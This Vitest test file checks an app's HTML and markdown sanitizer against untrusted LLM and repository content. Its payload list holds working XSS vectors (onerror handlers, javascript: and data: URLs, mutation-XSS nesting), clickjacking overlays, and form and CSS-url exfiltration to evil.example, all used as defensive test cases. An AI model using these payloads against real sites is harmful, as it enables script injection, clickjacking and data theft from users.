import { describe, it, expect } from 'vitest';
import DOMPurify from 'dompurify';
import { sanitizeHTML, markdownToSafeHTML } from '../sanitize';
import { htmlHazards as hazards } from './html-hazards';

/** The payload classes this app must survive, collected from untrusted sources:
 * an LLM's own text, tool output over an untrusted repository, a repository's
 * README or diff, an agent manifest, and language-server hover documentation. */
const PAYLOADS = [
    '<img src=x onerror=alert(1)>',
    '<svg><script>alert(1)</script></svg>',
    '<a href="javascript:alert(1)">click</a>',
    '[click](javascript:alert(1))',
    '[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
    '<iframe src="https://evil.example"></iframe>',
    '<form action="https://evil.example"><input name=x></form>',
    '<object data="data:text/html,<script>alert(1)</script>"></object>',
    '<base href="https://evil.example">',
    '<link rel=stylesheet href="https://evil.example/x.css">',
    '<style>body{background:url(https://evil.example/?c=1)}</style>',
    // A bare `<style>` is what DOMPurify's own defaults already refuse; every shape below
    // is one it keeps, because the element is nested in something. `marked` puts block
    // HTML in a container on the way through, so these are the shapes markdown actually
    // delivers — and the reason the bare shape alone proves nothing.
    '<div><style>#app{display:none}</style></div>',
    '<p>x</p><span><style>button{opacity:0}</style></span>',
    '<table><style>td{border:0}</style><tr><td>x</td></tr></table>',
    '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>">',
    '<template><script>alert(1)</script></template>',
    '<xmp><img src=x onerror=alert(1)></xmp>',
    '<noembed><img src=x onerror=alert(1)></noembed>',
    '<select><option><style></option></select><img src=x onerror=alert(1)>',
    '<textarea></textarea><img src=x onerror=alert(1)>',
    '<svg><foreignObject><div onclick=alert(1)>x</div></foreignObject></svg>',
    '<details open ontoggle=alert(1)>',
    '<a href="&#106;avascript:alert(1)">encoded scheme</a>',
    '<isindex action="https://evil.example" type=image>',
];

describe('sanitizeHTML', () => {
    it.each(PAYLOADS)('leaves nothing executable behind: %s', (payload) => {
        expect(hazards(sanitizeHTML(payload))).toEqual([]);
    });

    it('refuses the script element outright', () => {
        expect(sanitizeHTML('<p>ok</p><script>steal()</script>')).not.toContain('script');
    });

    it.each([
        ['a viewport-sized overlay', '<p style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#111">click here to continue</p>'],
        ['a box over a real button', '<div style="position:fixed;inset:0;opacity:0;z-index:9999">press me</div>'],
        ['an exfiltration URL', '<div style="background-image:url(https://evil.example/leak)">x</div>'],
        ['a legacy expression', '<div style="width:expression(alert(1))">x</div>'],
        ['an encoded scheme in a value', '<p styLe="position:fixed">x</p>'],
    ])('drops style entirely — %s', (_name, payload) => {
        const out = sanitizeHTML(payload);
        expect(out).not.toMatch(/style/i);
        // The text stays: the refusal is the attribute, not the sentence.
        expect(out.replace(/<[^>]*>/g, '')).not.toBe('');
    });

    it('keeps the text of a style-carrying fragment', () => {
        expect(sanitizeHTML('<p style="position:fixed">Signed in?</p>')).toContain('Signed in?');
    });

    it('adds a call site’s own tag refusal', () => {
        expect(sanitizeHTML('<p>a</p><hr><p>b</p>', ['hr'])).not.toContain('<hr');
        expect(sanitizeHTML('<p>a</p><hr><p>b</p>')).toContain('<hr');
    });

    it('cannot be talked out of a refusal by the tag list', () => {
        expect(hazards(sanitizeHTML('<p>ok</p><img src=x onerror=alert(1)>', ['script']))).toEqual([]);
    });

    // Control case: the refusal above is this module's config, not DOMPurify's
    // default. Left unguarded, the overlay markup below passes straight through,
    // so a change that drops FORBID_ATTR fails here rather than quietly reopening
    // the hole. (Same shape as backend/sandbox/hostenv_test.go: the assertion is
    // written against the leak, so it cannot pass by accident.)
    it('is not vacuous — DOMPurify’s defaults do keep style', () => {
        const overlay = '<p style="position:fixed;inset:0">click here to continue</p>';
        expect(DOMPurify.sanitize(overlay)).toBe(overlay);
        expect(hazards(DOMPurify.sanitize(overlay))).not.toEqual([]);
        expect(hazards(sanitizeHTML(overlay))).toEqual([]);
    });

    // The second refusal, held the same way: DOMPurify keeps a form element whole, and
    // `marked` passes an inline one through from a paragraph, so a model or a repository
    // can otherwise leave a live input + button inside a chat bubble.
    it('refuses a form — DOMPurify’s defaults keep it', () => {
        const form = '<form action="https://evil.example"><input name="t"><button>Go</button></form>';
        expect(DOMPurify.sanitize(form)).toContain('<form');
        const out = sanitizeHTML(form);
        expect(hazards(out)).toEqual([]);
        // The words survive; the control does not.
        expect(out).toContain('Go');
    });

    // The `<style>` refusal, held the same way — and this one is not a guess about the
    // library. Its defaults drop a **bare** `<style>` and keep one nested in anything, so
    // a suite written against the bare shape alone stays green with the hole wide open,
    // which is exactly what this file did until the nested shapes were measured.
    it('refuses a style element — DOMPurify’s defaults keep it when it is nested', () => {
        const nested = '<div><style>#app{display:none}</style></div>';
        expect(DOMPurify.sanitize(nested)).toContain('<style');   // the leak, on the pinned version
        expect(hazards(DOMPurify.sanitize(nested))).not.toEqual([]);
        expect(hazards(sanitizeHTML(nested))).toEqual([]);
        // The rules go with the element rather than being left behind as visible text.
        expect(sanitizeHTML(nested)).not.toMatch(/display:none|<style/i);
    });

    it('refuses a stylesheet an SVG carries inside itself', () => {
        // The shape a real icon file shipped until this refusal landed, so this is also
        // the check that an icon cannot smuggle a page-wide rule into the document.
        const svg = '<svg xmlns="http://www.w3.org/2000/svg"><style><![CDATA[.B{fill-opacity:0}]]></style><path d="M1 1"/></svg>';
        const out = sanitizeHTML(svg);
        expect(out).not.toMatch(/<style|fill-opacity:0/i);
        expect(hazards(out)).toEqual([]);
    });

    it('keeps the disabled checkbox `marked` emits for a task list', () => {
        // The accepted cost of refusing `form` and not `input`: GitHub-style task lists
        // are `<li><input disabled type=checkbox>` and are ordinary model output. A
        // checkbox with no form to submit is decoration, not a channel.
        const html = markdownToSafeHTML('- [ ] first\n- [x] second');
        expect(html).toContain('type="checkbox"');
        expect(hazards(html)).toEqual([]);
    });

    it('keeps the class attribute the LSP grammar colors with', () => {
        expect(sanitizeHTML('<pre><code class="language-go"><span class="tok-keyword">func</span></code></pre>'))
            .toContain('class="tok-keyword"');
    });
});

describe('markdownToSafeHTML', () => {
    it.each(PAYLOADS)('renders then sanitizes: %s', (payload) => {
        expect(hazards(markdownToSafeHTML(payload))).toEqual([]);
    });

    it('returns a string, never a promise', () => {
        const out = markdownToSafeHTML('# Title\n\nbody');
        expect(typeof out).toBe('string');
        expect(out).not.toContain('Promise');
        expect(out).toContain('<h1>Title</h1>');
    });

    it('keeps the markdown a real answer is made of', () => {
        const md = [
            '# Heading',
            '',
            'Some **bold**, *italic*, `inline code` and ~~strike~~.',
            '',
            '- first',
            '- second',
            '',
            '| a | b |',
            '| - | - |',
            '| 1 | 2 |',
            '',
            '> quoted',
            '',
            '[a link](https://example.com/docs)',
            '',
            '```go',
            'func main() {}',
            '```',
        ].join('\n');
        const html = markdownToSafeHTML(md);
        for (const fragment of [
            '<h1>Heading</h1>', '<strong>bold</strong>', '<em>italic</em>', '<code>inline code</code>',
            '<ul>', '<li>first</li>', '<table>', '<td>1</td>', '<blockquote>', 'href="https://example.com/docs"',
        ]) {
            expect(html).toContain(fragment);
        }
        expect(html).toMatch(/<pre><code class="language-go">/);
        expect(hazards(html)).toEqual([]);
    });

    it('keeps a same-origin and an absolute image reference for CSP to govern', () => {
        // An <img> is not a sink: it cannot execute, and CSP `img-src 'self' data:
        // blob:` decides whether it loads at all. Pinning this here so a future
        // tightening of the sanitizer is a decision about CSP, not an accident.
        const html = markdownToSafeHTML('![diagram](https://example.com/a.png)');
        expect(html).toContain('src="https://example.com/a.png"');
        expect(hazards(html)).toEqual([]);
    });
});
